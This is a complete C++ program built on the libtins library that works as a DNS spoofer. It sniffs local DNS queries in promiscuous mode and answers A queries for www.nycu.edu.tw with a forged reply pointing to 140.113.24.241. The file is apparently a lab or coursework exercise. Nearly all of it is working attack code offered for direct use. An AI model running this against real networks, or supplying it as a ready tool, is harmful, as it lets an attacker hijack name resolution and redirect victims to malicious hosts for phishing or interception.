#include <tins/tins.h>
#include <iostream>
#include <string>

using namespace Tins;
using namespace std;

const string target_domain = "www.nycu.edu.tw";
const IPv4Address spoofed_ip("140.113.24.241");
PacketSender sender;

// Handle DNS response for matched target domain
bool spoof_dns_response(const EthernetII& eth, const IP& ip, const UDP& udp, const DNS& dns, const DNS::query& query) {
    cout << "[+] Target domain match found: " << target_domain << endl;

    DNS spoofed_dns;
    spoofed_dns.id(dns.id());
    spoofed_dns.type(DNS::RESPONSE);
    spoofed_dns.recursion_desired(dns.recursion_desired());
    spoofed_dns.recursion_available(true);
    spoofed_dns.add_query(query);

    // Add the spoofed answer
    DNS::resource answer;
    answer.dname(target_domain);
    answer.query_type(DNS::A);
    answer.query_class(query.query_class());
    answer.ttl(300);
    answer.data(spoofed_ip.to_string());
    spoofed_dns.add_answer(answer);

    // Build the full response packet
    EthernetII response_eth(eth.src_addr(), eth.dst_addr());
    IP response_ip(ip.src_addr(), ip.dst_addr());
    UDP response_udp(udp.sport(), udp.dport());

    auto packet = response_eth / response_ip / response_udp / spoofed_dns;

    try {
        sender.send(packet);
        cout << "[+] Spoofed DNS response sent to " << ip.src_addr() << endl;
        return true;
    } catch (exception& e) {
        cerr << "[-] Failed to send packet: " << e.what() << endl;
        return false;
    }
}

// Callback function for packet processing
bool handle_packet(const PDU& pdu) {
    try {
        const EthernetII& eth = pdu.rfind_pdu<EthernetII>();
        const IP& ip = eth.rfind_pdu<IP>();
        const UDP& udp = ip.rfind_pdu<UDP>();

        // Only handle DNS requests
        if (udp.dport() != 53) return true;

        const DNS dns = udp.rfind_pdu<RawPDU>().to<DNS>();

        if (dns.type() != DNS::QUERY || dns.queries().empty()) {
            return true;
        }

        for (const auto& query : dns.queries()) {
            cout << "[*] DNS query for: " << query.dname() << endl;

            if (query.dname() == target_domain && query.query_type() == DNS::A) {
                return spoof_dns_response(eth, ip, udp, dns, query);
            }
        }
    } catch (exception& e) {
        cerr << "[-] Error processing packet: " << e.what() << endl;
    }

    return true;
}

int main(int argc, char* argv[]) {
    try {
        string interface_name;
        if (argc > 1) {
            interface_name = argv[1];
            cout << "[*] Using specified interface: " << interface_name << endl;
        } else {
            try {
                NetworkInterface iface = NetworkInterface::default_interface();
                interface_name = iface.name();
                cout << "[*] Using default interface: " << interface_name << endl;
            } catch (exception& e) {
                cerr << "[-] Failed to get default interface: " << e.what() << endl;
                return 1;
            }
        }

        sender.default_interface(interface_name);

        SnifferConfiguration config;
        config.set_promisc_mode(true);
        config.set_immediate_mode(true);
        config.set_filter("udp and dst port 53");

        Sniffer sniffer(interface_name, config);

        cout << "[*] DNS spoofer running..." << endl;
        cout << "[*] Target domain: " << target_domain << endl;
        cout << "[*] Spoofed IP: " << spoofed_ip << endl;
        cout << "[*] Press Ctrl+C to stop." << endl;

        sniffer.sniff_loop(handle_packet);
    } catch (exception& e) {
        cerr << "[-] Error: " << e.what() << endl;
        return 1;
    }

    return 0;
}
